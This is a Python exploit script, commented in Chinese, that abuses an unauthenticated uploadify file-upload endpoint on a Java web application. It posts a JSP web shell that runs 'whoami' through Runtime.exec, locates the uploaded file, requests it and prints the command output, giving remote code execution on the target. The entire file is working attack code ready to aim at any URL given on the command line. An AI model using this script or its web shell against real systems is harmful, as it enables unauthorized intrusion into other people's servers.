import requests
import sys
import urllib3
import re
urllib3.disable_warnings()

#本脚本只上传执行了whoami命令的文件

def GetShell(urllist):
    url = urllist+"/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/"
    flag ='whoami'
    proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
    headers = {"Accept": "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "zh-cn", "Accept-Encoding": "gzip, deflate",
               "Origin": "null", "Connection": "close",
               "Upgrade-Insecure-Requests": "1",
               "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryy8vI536lbhYEbvdD    ",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"}
    data = '''------WebKitFormBoundaryy8vI536lbhYEbvdD\r\nContent-Disposition: form-data; name="imgFile";filename="123213.jsp"\r\n\r\n<% {java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println("whoami:"+new String(b));}} %>\r\n------WebKitFormBoundaryy8vI536lbhYEbvdD--'''
    try:
        res=requests.post(url, headers=headers, data=data,verify=False,timeout=30)
        res=re.search(r'(.*?).jsp', res.text, re.S).group(0)
        if '.jsp' in res:
            listshell = urllist + "/plugins/uploadify/" + res
            print(urllist + " 测试文件上传成功。"+"\n"+"地址为：" + listshell)
            res2=requests.get(url=listshell, verify=False, timeout=30)
            res2=res2.text.replace("\n","")
            if 'whoami' in res2:
                print("查看命令whoami："+res2)
            else:
                print("验证地址失败，请手工查看："+listshell)
        else:
            print("文件上传失败")
    except Exception as e:
        print("脚本运行错误"+e)

def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        GetShell(url)
    else:
        print("python3 rce.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    main()
